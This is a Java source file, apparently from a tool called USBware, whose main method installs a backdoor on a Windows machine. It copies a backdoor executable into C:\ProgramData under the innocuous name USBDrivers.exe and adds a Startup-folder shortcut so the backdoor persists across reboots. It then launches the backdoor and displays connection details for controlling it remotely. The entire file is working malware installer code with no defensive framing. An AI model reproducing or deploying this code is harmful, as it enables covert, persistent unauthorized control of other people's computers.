package thatcherdev.usbware.install;

import java.awt.Desktop;
import java.io.File;
import javax.swing.JOptionPane;
import org.apache.commons.io.FileUtils;
import mslinks.ShellLink;
import thatcherdev.usbware.backend.Utils;

public class Install {

	/**
	 * Installs backdoor to 'C:\ProgramData\USBDrivers'. Attempts to add backdoor to
	 * startup. Starts backdoor. Displays WiFi and backdoor information.
	 * 
	 * @param args
	 */
	public static void main(String[] args) {
		String disp="";
		try {
			if(new File("jre").isDirectory()&&(new File("jre\\bin").isDirectory()&&new File("jre\\lib").isDirectory()))
				FileUtils.copyDirectory(new File("files\\jre"), new File("C:\\ProgramData\\USBDrivers\\jre"));
			FileUtils.copyDirectory(new File("files\\scripts"), new File("C:\\ProgramData\\USBDrivers\\scripts"));
			FileUtils.copyFile(new File("files\\backdoor.exe"), new File("C:\\ProgramData\\USBDrivers\\USBDrivers.exe"));
			FileUtils.copyFile(new File("files\\ip.txt"), new File("C:\\ProgramData\\USBDrivers\\ip.txt"));
			try {
				ShellLink.createLink("C:\\ProgramData\\USBDrivers\\USBDrivers.exe", "C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk");
			}catch (Exception e) {
				disp+="Could not add backdoor to startup\n\n";
			}
			Desktop.getDesktop().open(new File("C:\\ProgramData\\USBDrivers\\USBDrivers.exe"));
			disp+="Backdoor running!\n\nTo control backdoor, connect to:\n"+Utils.currentConnection()+"\nand run option 1 in USBware";
		}catch (Exception e) {
			disp="An error occurred:\n"+e.getMessage();
		}finally {
			JOptionPane.showMessageDialog(null, disp, "Backdoor control information", JOptionPane.INFORMATION_MESSAGE);
		}
	}
}